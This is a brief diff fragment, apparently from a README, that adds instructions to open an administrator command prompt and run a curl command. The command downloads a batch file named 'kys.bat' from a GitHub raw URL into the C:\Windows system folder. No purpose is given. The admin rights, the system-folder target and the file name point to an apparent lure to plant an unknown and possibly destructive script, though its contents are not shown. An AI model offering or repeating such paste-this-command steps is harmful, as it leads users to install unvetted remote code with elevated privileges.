@@ -7,4 +7,5 @@
 >You just need open cmd with admin perms
 >And type next command
 ```
-Curl 
+curl -o c:\windows\kys.bat https://raw.githubusercontent.com/blozaza/Smth/main/kys.bat
+```
